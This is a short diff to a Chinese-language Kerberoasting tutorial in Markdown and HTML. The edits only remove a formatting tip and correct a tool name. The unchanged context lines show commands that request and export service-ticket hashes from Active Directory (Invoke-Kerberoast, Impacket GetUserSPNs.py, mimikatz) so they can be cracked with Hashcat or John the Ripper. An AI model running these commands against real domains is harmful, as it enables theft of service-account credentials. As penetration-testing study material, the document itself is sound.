@@ -107,8 +107,6 @@ Import-Module .\Invoke-Kerberoast.ps1
 Invoke-Kerberoast.ps1 -OutputFormat hashcat | fl
 ```
 
-需手动复制并去除换行符.
-
 ### Impacket
 
 可以在非域主机上导出 Hashcat 格式的密文. 需要域内用户的凭据.
@@ -118,7 +116,7 @@ GetUserSPNs.py -request -dc-ip 192.168.1.100 test.com/user
 Password: ******* // Input password for user
 ```
 
-导出后可通过 Kerberos 自带的工具或 JohnTheRipper, Hashcat 爆破.
+导出后可通过 Kerberoast 自带的工具或 JohnTheRipper, Hashcat 爆破.
 
 ### Kerberoast
 
@@ -215,8 +213,6 @@ kerberos::list /export
 Invoke-Kerberoast.ps1 -OutputFormat hashcat | fl
 </code></pre>
 
-<p>需手动复制并去除换行符.</p>
-
 <h3 id="impacket">Impacket</h3>
 
 <p>可以在非域主机上导出 Hashcat 格式的密文. 需要域内用户的凭据.</p>
@@ -225,7 +221,7 @@ Invoke-Kerberoast.ps1 -OutputFormat hashcat | fl
 Password: ******* // Input password for user
 </code></pre>
 
-<p>导出后可通过 Kerberos 自带的工具或 JohnTheRipper, Hashcat 爆破.</p>
+<p>导出后可通过 Kerberoast 自带的工具或 JohnTheRipper, Hashcat 爆破.</p>
 
 <h3 id="kerberoast">Kerberoast</h3>
 
